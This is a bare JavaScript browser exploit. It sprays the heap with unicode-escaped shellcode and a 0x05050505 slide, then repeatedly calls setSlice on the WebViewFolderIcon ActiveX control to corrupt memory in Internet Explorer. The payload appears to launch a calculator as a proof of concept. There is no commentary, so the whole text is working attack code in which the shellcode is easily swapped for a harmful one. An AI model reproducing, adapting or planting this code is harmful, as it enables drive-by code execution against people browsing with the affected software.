	var heapSprayToAddress = 0x05050505;
	var payLoadCode = unescape(
	"%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120" +
	"%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424" +
	"%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304" +
	"%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0" +
	"%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%uF068%u048A%u685F%uFE98%u0E8A" +
	"%uFF57%u63E7%u6C61%u0063");
	var heapBlockSize = 0x400000;
	var payLoadSize = payLoadCode.length * 2;
	var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
	var spraySlide = unescape("%u0505%u0505");
	spraySlide = getSpraySlide(spraySlide,spraySlideSize);
	heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
	memory = new Array();

	for (i=0;i<heapBlocks;i++)
	{
		memory[i] = spraySlide + payLoadCode;
	}

   	for ( i = 0 ; i < 128 ; i++) 
	{
		try{ 
			var tar = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
			tar.setSlice(0x7ffffffe, 0x05050505, 0x05050505,0x05050505 ); 
		}catch(e){}
	}

	function getSpraySlide(spraySlide, spraySlideSize)
	{
		while (spraySlide.length*2<spraySlideSize)
		{
			spraySlide += spraySlide;
		}
		spraySlide = spraySlide.substring(0,spraySlideSize/2);
		return spraySlide;
	}
